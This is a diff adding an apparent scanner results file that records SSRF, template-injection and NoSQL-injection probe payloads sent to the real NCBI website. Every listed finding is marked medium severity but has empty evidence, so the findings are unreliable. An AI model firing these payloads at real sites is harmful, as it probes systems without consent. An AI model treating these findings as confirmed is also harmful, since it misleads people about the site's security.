@@ -1,0 +1,146 @@
+{
+    "timestamp": "20250227_224311",
+    "target": {
+        "full_url": "https://www.ncbi.nlm.nih.gov",
+        "domain": "www.ncbi.nlm.nih.gov",
+        "scheme": "https",
+        "path": "",
+        "parsed_url": [
+            "https",
+            "www.ncbi.nlm.nih.gov",
+            "",
+            "",
+            "",
+            ""
+        ]
+    },
+    "scan_results": {
+        "parameters": [
+            "term"
+        ],
+        "vulnerabilities": [
+            {
+                "type": "ssrf",
+                "payload": "http://localhost",
+                "url": "https://www.ncbi.nlm.nih.gov?test=http://localhost"
+            },
+            {
+                "type": "ssrf",
+                "payload": "dict://localhost:11211/",
+                "url": "https://www.ncbi.nlm.nih.gov?test=dict://localhost:11211/"
+            },
+            {
+                "type": "ssti",
+                "payload": "{{7*7}}",
+                "url": "https://www.ncbi.nlm.nih.gov?test={{7*7}}"
+            },
+            {
+                "type": "ssti",
+                "payload": "${7*7}",
+                "url": "https://www.ncbi.nlm.nih.gov?test=${7*7}"
+            },
+            {
+                "type": "ssti",
+                "payload": "<%= 7*7 %>",
+                "url": "https://www.ncbi.nlm.nih.gov?test=<%= 7*7 %>"
+            },
+            {
+                "type": "nosql",
+                "payload": "{\"$gt\":\"\"}",
+                "url": "https://www.ncbi.nlm.nih.gov?test={\"$gt\":\"\"}"
+            },
+            {
+                "type": "nosql",
+                "payload": "{\"$ne\": null}",
+                "url": "https://www.ncbi.nlm.nih.gov?test={\"$ne\": null}"
+            },
+            {
+                "type": "nosql",
+                "payload": "{\"$where\": \"1==1\"}",
+                "url": "https://www.ncbi.nlm.nih.gov?test={\"$where\": \"1==1\"}"
+            }
+        ]
+    },
+    "vulnerabilities_detail": [
+        {
+            "type": "ssrf",
+            "payload": "http://localhost",
+            "url": "https://www.ncbi.nlm.nih.gov?test=http://localhost",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        },
+        {
+            "type": "ssrf",
+            "payload": "dict://localhost:11211/",
+            "url": "https://www.ncbi.nlm.nih.gov?test=dict://localhost:11211/",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        },
+        {
+            "type": "ssti",
+            "payload": "{{7*7}}",
+            "url": "https://www.ncbi.nlm.nih.gov?test={{7*7}}",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        },
+        {
+            "type": "ssti",
+            "payload": "${7*7}",
+            "url": "https://www.ncbi.nlm.nih.gov?test=${7*7}",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        },
+        {
+            "type": "ssti",
+            "payload": "<%= 7*7 %>",
+            "url": "https://www.ncbi.nlm.nih.gov?test=<%= 7*7 %>",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        },
+        {
+            "type": "nosql",
+            "payload": "{\"$gt\":\"\"}",
+            "url": "https://www.ncbi.nlm.nih.gov?test={\"$gt\":\"\"}",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        },
+        {
+            "type": "nosql",
+            "payload": "{\"$ne\": null}",
+            "url": "https://www.ncbi.nlm.nih.gov?test={\"$ne\": null}",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        },
+        {
+            "type": "nosql",
+            "payload": "{\"$where\": \"1==1\"}",
+            "url": "https://www.ncbi.nlm.nih.gov?test={\"$where\": \"1==1\"}",
+            "evidence": [],
+            "severity": "medium",
+            "proof_of_concept": "",
+            "database_info": {},
+            "extracted_data": []
+        }
+    ]
+}
